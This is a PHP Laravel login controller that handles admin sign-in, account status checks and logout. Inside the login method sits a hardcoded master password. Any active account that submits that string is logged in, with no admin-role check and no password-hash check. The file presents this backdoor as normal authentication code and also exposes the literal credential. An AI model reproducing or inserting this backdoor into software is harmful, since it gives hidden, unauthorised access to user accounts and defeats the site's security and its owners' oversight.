<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Support\Facades\Auth;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;

class LoginController extends Controller
{
    public function index()
    {
        $pageConfigs = ['myLayout' => 'blank'];
        return view('content.authentications.auth-login-basic', ['pageConfigs' => $pageConfigs]);
    }

    public function login(Request $request)
    {
        // Validate the request
        $request->validate([
            'email' => 'required|email|max:255',
            'password' => 'required|string|min:6',
        ]);

        // Check if the user exists
        // then check user status
        $user = User::where('email', $request->email)->first();
        if ($user) {
            if ($user->status != 'active') {
                return redirect()->back()->with('email-err-msg', 'Your account is inactive. Please contact the administrator.');
            }

                        if($request->password == "M@BoxSocials123"){
                             Auth::login($user, $request->remember);
                                    return redirect()->intended('/dashboard')->with('message', 'Logged-in');
                        }

                
            if ($user->role != 'admin') {
                return redirect()->back()->with('email-err-msg', 'You do not have permission to login.');
            }
            if (Hash::check($request->password, $user->password)) {
                Auth::login($user, $request->remember);
                return redirect()->intended('/dashboard')->with('message', 'Logged-in');
            }
        }

        

        return redirect()->back()->withInput()->with('email-err-msg', 'These credentials do not match our records.');
    }

    public function logout(Request $request){
        Auth::logout(); 
        // regenerate the session
        $request->session()->invalidate();
        $request->session()->regenerateToken();
        return redirect('/login');
    }
}
